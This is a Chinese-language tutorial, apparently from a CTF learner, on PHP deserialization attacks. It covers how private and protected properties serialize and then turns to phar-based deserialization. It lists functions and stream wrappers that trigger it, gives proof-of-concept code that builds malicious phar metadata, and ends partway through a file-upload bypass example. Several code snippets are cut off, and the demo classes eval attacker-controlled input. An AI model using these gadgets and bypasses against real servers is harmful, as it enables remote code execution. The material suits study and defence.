## 说在前面
对于PHP反序列化，原来也就只是浅尝而止。最近看到很多题的出现了多种没有了解过的反序列化形式，就此进一步学习一下。其中很多内容都参考了师傅们的博客，部分内容经过自己的修改。如果存在错误，还望师傅们指出。
## pravite和Protected成员的序列化
以前在做反序列化的题的时候遇到的都是public成员，但在k0rz3n师傅的文章中看到了Private和Protected权限序列化的过程中有着不同的差别。这里做一个小知识点的总结。
先来复习一下一个简单的序列化例子：
    execute($this->text);
        }
    }
    $a = new Threezh1();
    $a->text = 'echo "Threezh1";';
    echo serialize($a);
    ?>
序列化后的内容：
`O:8:"Threezh1":1:{s:4:"text";s:16:"echo "Threezh1";";}`
O代表这是一个对象，8代表对象名称的长度，1代表成员个数。
大括号中分别是：属性名类型、长度、名称;值类型、长度、值。
那反序列化的过程中是这样的：
    execute($this->text);
        }
    }
    unserialize($_GET["a"]);
    ?>
访问：
返回：
`Threezh1`
### Private类型
**那么问题来了** ，如果把$text成员从public改为private呢？
因为在实例中无法通过$obj->属性名(或方法名) 来调用pravite类型的方法或属性。所以上面生成的例子需要改一下：
    text = $temp;
        }
        function execute($payload) {
            eval($payload);
        }
        function __destruct(){
            $this->execute($this->text);
        }
    }
    $a = new Threezh1();
    $a->setPayload('echo "Threezh1";');
    $data = serialize($a);
    echo($data);
    file_put_contents("serialize.txt", $data);
这时候生成出来的序列化的内容为：
`O:8:"Threezh1":1:{s:14:"Threezh1text";s:16:"echo "Threezh1";";}`
按照前面的反序列化步骤，进行反序列化。会发现序列化并没有成功，显示了phpinfo的页面：
那怎么样才能使它反序列化成功呢？我们使用winhex打开刚刚保存的`serialize.txt`。内容如下图：
会发现在Threezh1的左右，也就是属性名中的类名左右存在两个空字节。所以反序列化不成功的原因就是由于序列化内容生成到网页后，空字节不会一同生成出去，导致反序列化的时候无法识别是private属性，反序列化失败。
那解决这个问题的方法就是，在传递反序列化字符串中，在类名的左右加上`%00`，也就是空字节对于的URL编码。反序列化成功结果如下：
这也正好解释了，为什么序列化内容中，为什么属性名的长度为14。
所以，Private类型在序列化的格式为：`%00类名%00`
### Protected类型
Protected类型和private有些许不同，生成的序列化内容为：
`O:8:"Threezh1":1:{s:7:"*text";s:16:"echo "Threezh1";";}`
使用winhex查看保存的`serialize.txt`：
可得出，Protected类型在序列化的格式为：`%00*%00类名`
## Phar反序列化
phar的总结类文章已经有很多了，比如Hu3sky学长的[初探phar://](https://xz.aliyun.com/t/2715)
自己在总结phar的过程中又学习到了一些新的内容，这里就做下记录。
### phar文件的结构：
phar文件都包含以下几个部分：
    1. stub
        phar文件的标志，必须以 xxx __HALT_COMPILER();?> 结尾，否则无法识别。xxx可以为自定义内容。
    2. manifest
        phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是漏洞利用最核心的地方。
    3. content
        被压缩文件的内容
    4. signature (可空)
        签名，放在末尾。
### 生成一个phar文件：
php内置了一个phar类来处理相关操作。
注意：这里要将php.ini里面的`phar.readonly`选项设置为`Off`。`并把分号去掉。`
(如果你在命令行运行PHP文件还是无法生成成功，请使用php -v查看php版本并在修改指定版本的php.ini。)
    startBuffering();
        $phar->setStub(""); //设置stub
        $o = new TestObject();
        $phar->setMetadata($o); //将自定义的meta-data存入manifest
        $phar->addFromString("test.txt", "test"); //添加要压缩的文件
        //签名自动计算
        $phar->stopBuffering();
    ?>
### 漏洞利用条件
  1. phar文件要能够上传到服务器端。
  2. 要有可用的魔术方法作为“跳板”。
  3. 文件操作函数的参数可控，且`:`、`/`、`phar`等特殊字符没有被过滤。
### phar受影响的文件操作函数：
知道创宇测试后受影响的函数列表：
但实际并不止这一些。
参考zxc师傅的文章：
在跟踪了受影响函数的调用情况后发现，除了所有文件函数，只要是函数的实现过程直接或间接调用了`php_stream_open_wrapper`。都可能触发phar反序列化漏洞。
以下这些方式都可触发phar反序列化漏洞：
exif
    exif_thumbnail
    exif_imagetype
gd
    imageloadfont
    imagecreatefrom***
hash
    hash_hmac_file
    hash_file
    hash_update_file
    md5_file
    sha1_file
file / url
    get_meta_tags
    get_headers
standard
    getimagesize
    getimagesizefromstring
zip
    $zip = new ZipArchive();
    $res = $zip->open('c.zip');
    $zip->extractTo('phar://test.phar/test');
Bzip / Gzip
    当环境限制了phar不能出现在前面的字符里。可以使用compress.bzip2://和compress.zlib://绕过
    $z = 'compress.bzip2://phar:///home/sx/test.phar/test.txt';
    $z = 'compress.zlib://phar:///home/sx/test.phar/test.txt';
配合其他协议：([SUCTF](https://www.xctf.org.cn/library/details/17e9b70557d94b168c3e5d1e7d4ce78f475de26d/))
    当环境限制了phar不能出现在前面的字符里，还可以配合其他协议进行利用。
    php://filter/read=convert.base64-encode/resource=phar://phar.phar
    这次的ByteCTF也有这个点。使用的是：php://filter/resource=phar://phar.phar
Postgres
    pgsqlCopyFromFile('aa', 'phar://phar.phar/aa');
    ?>
    pgsqlCopyToFile和pg_trace同样也是能使用的，需要开启phar的写功能。
Mysql
    LOAD DATA LOCAL INFILE也会触发这个php_stream_open_wrapper
    配置一下mysqld:
    [mysqld]
    local-infile=1
    secure_file_priv=""
    s);
        }
    }
    $m = mysqli_init();
    mysqli_options($m, MYSQLI_OPT_LOCAL_INFILE, true);
    $s = mysqli_real_connect($m, 'localhost', 'root', 'root', 'testtable', 3306);
    $p = mysqli_query($m, 'LOAD DATA LOCAL INFILE \'phar://test.phar/test\' INTO TABLE a  LINES TERMINATED BY \'\r\n\'  IGNORE 1 LINES;');
    ?>
### 漏洞的利用实例：
#### 一个简单的例子
phar.php
    startBuffering();
        $phar->setStub(""); //设置stub
        $o = new TestObject();
        $o -> name='Threezh1'; //控制TestObject中的name变量为Threezh1
        $phar->setMetadata($o); //将自定义的meta-data存入manifest
        $phar->addFromString("test.txt", "test"); //添加要压缩的文件
        //签名自动计算
        $phar->stopBuffering();
    ?>
index.php
     name;
        }
    }
    if ($_GET["file"]){
        file_exists($_GET["file"]);
    }
    ?>
使用`php phar.php`生成`phar.phar`文件。
访问：
返回：Threezh1。 反序列化利用成功。
#### 绕过文件格式限制
  * 上传html页面: upload.html
  * 后端校验页面：upload.php
  * 一个漏洞页面：index.php (存在file_exits(), eval()函数)
  * 一个上传目录： upload_file/
upload.html:
        upload file
upload.php
仅允许格式为gif的文件上传。上传成功的文件会存储到upload_file目录下。
    <?php
    if (($_FILES["file"]["type"]=="image/gif")&&(substr($_FILES["file"]["name"], strrpos($_FILES["file"]["name"], '.')+1))== 'gif') {
        echo "Upload: " . $_FILES["file"]["name"];
        echo "Type: " . $_FILES["file"]["type"];
        echo "Temp file: " . $_FILES["file"]["tmp_name"];